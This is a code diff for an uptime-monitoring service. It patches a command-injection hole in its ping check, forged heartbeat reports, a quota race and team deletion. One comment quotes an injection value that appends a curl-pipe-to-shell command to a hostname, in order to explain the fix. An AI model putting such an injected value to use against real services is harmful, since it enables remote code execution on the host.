@@ -20,7 +20,7 @@ import { checkAiVisibility } from './ai-visibility.js';
 // node:net / node:os / node:util 保留静态 import（pg 驱动经 Hyperdrive 依赖 net，必然可用）。
 let _dnsMod = null;   // null=未加载, false=不可用
 let _tlsMod = null;
-let _execAsync = null;
+let _execFile = null;
 async function getDns() {
   if (_dnsMod === null) { try { _dnsMod = await import('node:dns'); } catch { _dnsMod = false; } }
   return _dnsMod || null;
@@ -29,19 +29,25 @@ async function getTls() {
   if (_tlsMod === null) { try { _tlsMod = await import('node:tls'); } catch { _tlsMod = false; } }
   return _tlsMod || null;
 }
-async function getExecAsync() {
-  if (_execAsync === null) {
+// P0-S1：必须用 execFile（参数数组、不经 shell）。旧的 `exec(\`ping ... ${host}\`)` 会把
+// 用户填的 target 直接拼进 shell 命令，`example.com; curl http://x | sh` 即可远程执行。
+async function getExecFile() {
+  if (_execFile === null) {
     try {
       const cp = await import('node:child_process');
-      _execAsync = promisify(cp.exec || (cp.default && cp.default.exec));
-    } catch { _execAsync = false; }
+      _execFile = promisify(cp.execFile || (cp.default && cp.default.execFile));
+    } catch { _execFile = false; }
   }
-  return _execAsync || null;
+  return _execFile || null;
 }
 
 // 单点 HTTP/Keyword 检查超时（ms）。东京探针探远端偶发抖动，10s 偏紧易误判 down；
 // 提到 15s，并允许经环境变量 CHECK_TIMEOUT_MS 调参，无需重新部署即可微调。
 const HTTP_TIMEOUT_MS = Number(process.env.CHECK_TIMEOUT_MS) || 15000;
+
+// AbortSignal.timeout() 抛的是 DOMException/TimeoutError，不是 AbortError。
+// 统一判定，避免超时被当成普通错误落到 last_error（前端看不到 timeout 语义）。
+const isTimeoutErr = (err) => !!err && (err.name === 'AbortError' || err.name === 'TimeoutError');
 
 // 检查结果回调（由 alerts.js 注入），签名：(monitor, result, ctx)
 let onCheckResult = null;
@@ -77,13 +83,21 @@ const slowState = new Map(); // monitorId -> lastSlowAt
 
 export function createMonitor({ url, name, interval = 60, userId = null, type = 'http', config = {}, channels = null, teamId = null }) {
   const id = crypto.randomUUID();
+  // Heartbeat 上报令牌（P1，2026-11-18）：上报端点旧实现只凭 id 就能把任意监控改成 up，
+  // 而公开状态页会把 id 返回给访客。新建的 heartbeat 监控一律生成令牌，上报时必须带 ?token=。
+  let finalConfig = config;
+  if (type === 'heartbeat') {
+    const base = (config && typeof config === 'object') ? { ...config } : {};
+    if (!base.heartbeatToken) base.heartbeatToken = crypto.randomBytes(16).toString('hex');
+    finalConfig = base;
+  }
   return {
     id,
     url,
     name: name || url,
     interval,
     type,
-    config,
+    config: finalConfig,
     channels,
     status: 'unknown',
     statusPublic: false,
@@ -117,12 +131,7 @@ function rowToMonitor(row) {
   };
 }
 
-export async function saveMonitor(monitor) {
-  const pool = await getPool();
-  const cfg = monitor.config && typeof monitor.config === 'object' ? JSON.stringify(monitor.config) : (monitor.config || null);
-  const ch = monitor.channels && typeof monitor.channels === 'object' ? JSON.stringify(monitor.channels) : (monitor.channels || null);
-  await pool.query(
-    `INSERT INTO monitors (id, url, name, interval, type, config, channels, status, status_public, last_checked, last_response_time, last_error, last_alert_at, alert_count, consecutive_failures, last_success_at, user_id, team_id)
+const MONITOR_UPSERT_SQL = `INSERT INTO monitors (id, url, name, interval, type, config, channels, status, status_public, last_checked, last_response_time, last_error, last_alert_at, alert_count, consecutive_failures, last_success_at, user_id, team_id)
      VALUES ($1,$2,$3,$4,$5,$6,$7,$8,$9,$10,$11,$12,$13,$14,$15,$16,$17,$18)
      ON CONFLICT (id) DO UPDATE SET
        url                 = EXCLUDED.url,
@@ -139,16 +148,78 @@ export async function saveMonitor(monitor) {
        last_alert_at       = EXCLUDED.last_alert_at,
        alert_count         = EXCLUDED.alert_count,
        consecutive_failures = EXCLUDED.consecutive_failures,
-       last_success_at     = EXCLUDED.last_success_at,
-       team_id             = EXCLUDED.team_id`,
-    [
-      monitor.id, monitor.url, monitor.name, monitor.interval, monitor.type, cfg, ch,
-      monitor.status, monitor.statusPublic ?? false, monitor.lastChecked ?? null,
-      monitor.lastResponseTime ?? null, monitor.lastError ?? null, monitor.lastAlertAt ?? null,
-      monitor.alertCount ?? 0, monitor.consecutiveFailures ?? 0, monitor.lastSuccessAt ?? null, monitor.userId || null,
-      monitor.teamId || null,
-    ]
+       -- P0-S4：heartbeat 的 last_success_at 是「客户端上报时间」，只能由上报端点写。
+       -- 轮询（含 dead-man 检查）若把它刷新成检查时间，会让监控自我续命、真停了也不告警。
+       last_success_at     = CASE WHEN EXCLUDED.type = 'heartbeat' THEN monitors.last_success_at ELSE EXCLUDED.last_success_at END,
+       team_id             = EXCLUDED.team_id`;
+
+function monitorParams(monitor) {
+  const cfg = monitor.config && typeof monitor.config === 'object' ? JSON.stringify(monitor.config) : (monitor.config || null);
+  const ch = monitor.channels && typeof monitor.channels === 'object' ? JSON.stringify(monitor.channels) : (monitor.channels || null);
+  return [
+    monitor.id, monitor.url, monitor.name, monitor.interval, monitor.type, cfg, ch,
+    monitor.status, monitor.statusPublic ?? false, monitor.lastChecked ?? null,
+    monitor.lastResponseTime ?? null, monitor.lastError ?? null, monitor.lastAlertAt ?? null,
+    monitor.alertCount ?? 0, monitor.consecutiveFailures ?? 0, monitor.lastSuccessAt ?? null, monitor.userId || null,
+    monitor.teamId || null,
+  ];
+}
+
+export async function saveMonitor(monitor) {
+  const pool = await getPool();
+  await pool.query(MONITOR_UPSERT_SQL, monitorParams(monitor));
+}
+
+// 原子建监控（P1，2026-11-18）：把「配额检查」与「插入」放进同一个事务，
+// 并用事务级 advisory lock 按用户串行化。旧实现 SELECT count 后再 INSERT，
+// 并发请求可以同时通过检查、突破套餐上限（v1 无配额时更严重）。
+// 返回 true=已创建；false=已达上限（调用方回 403）。
+export async function insertMonitorWithinLimit(monitor, limit) {
+  if (!monitor.userId) { await saveMonitor(monitor); return true; }
+  const pool = await getPool();
+  let client;
+  try {
+    client = await pool.connect();
+  } catch (e) {
+    // 连接池不可用（极少数运行时的 socket 限制）：退回非原子写入，
+    // 优先保证「能建监控」；调用方此前已做过一次 count 检查，不是完全无防护。
+    console.warn('[monitor] 无法开启配额事务，退回非原子写入:', e && e.message);
+    await saveMonitor(monitor);
+    return true;
+  }
+  try {
+    await client.query('BEGIN');
+    // hashtext 把用户 id 映射成 32 位锁键；事务提交/回滚即释放，不会泄漏锁
+    await client.query('SELECT pg_advisory_xact_lock(hashtext($1))', ['monitor_quota:' + monitor.userId]);
+    const { rows } = await client.query('SELECT COUNT(*)::int AS n FROM monitors WHERE user_id = $1', [monitor.userId]);
+    if ((rows[0]?.n || 0) >= limit) {
+      await client.query('ROLLBACK');
+      return false;
+    }
+    await client.query(MONITOR_UPSERT_SQL, monitorParams(monitor));
+    await client.query('COMMIT');
+    return true;
+  } catch (e) {
+    try { await client.query('ROLLBACK'); } catch { /* 忽略回滚失败，抛原错 */ }
+    throw e;
+  } finally {
+    client.release();
+  }
+}
+
+// Heartbeat 上报专用写入（P0-S4 配套）：只有这里能改 last_success_at。
+// 不能复用 saveMonitor —— 它对 heartbeat 类型刻意保留旧值（防止轮询自我续命），
+// 若上报也走那条 SQL，会导致「上报永远不生效」的反向 bug。
+export async function recordHeartbeat(id, ts = Date.now()) {
+  const pool = await getPool();
+  const { rowCount } = await pool.query(
+    `UPDATE monitors
+        SET last_success_at = $2,
+            status = CASE WHEN status = 'down' THEN 'up' ELSE status END
+      WHERE id = $1 AND type = 'heartbeat'`,
+    [id, ts]
   );
+  return (rowCount || 0) > 0;
 }
 
 export async function saveEvent(monitorId, event) {
@@ -275,17 +346,23 @@ export async function listTeamMonitors(teamId) {
   return rows.map(rowToMonitor);
 }
 
-export async function deleteMonitor(id, userId) {
+// 删除监控。归属按「本人优先、团队次之」两级判定：
+// 旧实现只按 user_id 限定，团队成员删除共享监控时删 0 行却仍回 ok（P1 假成功）。
+export async function deleteMonitor(id, userId, teamId = null) {
   const pool = await getPool();
-  let rowCount;
   if (userId) {
-    const { rowCount: n } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id = $2', [id, userId]);
-    rowCount = n;
-  } else {
-    const { rowCount: n } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id IS NULL', [id]);
-    rowCount = n;
+    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id = $2', [id, userId]);
+    if (rowCount > 0) return true;
   }
-  return rowCount > 0;
+  if (teamId) {
+    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND team_id = $2', [id, teamId]);
+    return rowCount > 0;
+  }
+  if (!userId) {
+    const { rowCount } = await pool.query('DELETE FROM monitors WHERE id = $1 AND user_id IS NULL', [id]);
+    return rowCount > 0;
+  }
+  return false;
 }
 
 export async function getHistory(id, limit = 50) {
@@ -367,7 +444,7 @@ async function checkHttp(url, config) {
     return { status: 'up', error: null };
   } catch (err) {
     clearTimeout(timeout);
-    return { status: 'down', error: err.name === 'AbortError' ? 'timeout' : err.message };
+    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
   }
 }
 
@@ -378,8 +455,9 @@ async function checkKeyword(url, config) {
   const timeout = setTimeout(() => controller.abort(), HTTP_TIMEOUT_MS);
   try {
     const res = await safeFetch(url, { method: 'GET', signal: controller.signal, headers: { 'User-Agent': 'Pingory/1.0' } });
-    clearTimeout(timeout);
     if (!res.ok) return { status: 'down', error: `HTTP ${res.status}` };
+    // P0-S3：超时必须覆盖 res.text()。旧代码在读完响应头就 clearTimeout，
+    // 「只握手不吐 body」的目标会让这里永久挂起并占住并发槽。
     const body = await res.text();
     const found = config.keywordCaseSensitive
       ? body.includes(kw)
@@ -388,17 +466,23 @@ async function checkKeyword(url, config) {
       ? { status: 'up', error: null }
       : { status: 'down', error: MON_ERR.KW_NOT_FOUND + "|" + kw };
   } catch (err) {
+    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
+  } finally {
     clearTimeout(timeout);
-    return { status: 'down', error: err.name === 'AbortError' ? 'timeout' : err.message };
   }
 }
 
 async function checkPing(host) {
-  const execAsync = await getExecAsync();
-  if (!execAsync) return { status: 'down', error: MON_ERR.PING_FAILED }; // Worker：无 child_process
-  const flag = os.platform() === 'win32' ? '-n 1' : '-c 1';
+  const execFile = await getExecFile();
+  if (!execFile) return { status: 'down', error: MON_ERR.PING_FAILED }; // Worker：无 child_process
+  // 第二道防线：即便 execFile 不经 shell，也拒绝以 '-' 开头（会被 ping 当成选项）
+  // 与任何非主机名字符（空白、引号、; | & $ ` 等）。
+  if (!/^[A-Za-z0-9._:][A-Za-z0-9._:-]*$/.test(host)) {
+    return { status: 'down', error: MON_ERR.PING_FAILED };
+  }
+  const args = os.platform() === 'win32' ? ['-n', '1', host] : ['-c', '1', host];
   try {
-    const { stdout } = await execAsync(`ping ${flag} ${host}`, { timeout: 8000 });
+    const { stdout } = await execFile('ping', args, { timeout: 8000 });
     const ok = /ttl=/i.test(stdout) || /1 received/i.test(stdout) || /bytes from/i.test(stdout);
     return ok ? { status: 'up', error: null } : { status: 'down', error: MON_ERR.PING_NO_RESPONSE };
   } catch {
@@ -495,7 +579,8 @@ async function checkApi(url, config) {
     }
     return { status: 'up', error: null };
   } catch (err) {
-    return { status: 'down', error: err.name === 'AbortError' ? 'timeout' : err.message };
+    // safeFetch 默认 15s AbortSignal 超时（P0-S3），覆盖到 res.json() 读取
+    return { status: 'down', error: isTimeoutErr(err) ? 'timeout' : err.message };
   }
 }
 
@@ -766,10 +851,10 @@ export async function checkMonitor(monitor) {
   monitor.lastResponseTime = responseTime;
   monitor.lastError = result.error;
 
-  // Heartbeat 上报成功时间戳在端点更新；此处若 up 则刷新
-  if (monitor.type === 'heartbeat' && result.status === 'up') {
-    monitor.lastSuccessAt = Date.now();
-  }
+  // P0-S4：这里**不得**刷新 lastSuccessAt。
+  // 它代表「客户端最后一次上报时间」，只有 POST /api/heartbeat/:id 能写；
+  // 若检查时把 up 写回当前时间，dead-man 会每轮自我续命 ⇒ 客户端真停了也不告警。
+  // （saveMonitor 对 heartbeat 类型也已跳过该列，双保险。）
 
   await saveMonitor(monitor);
   await saveCheck(monitor.id, {
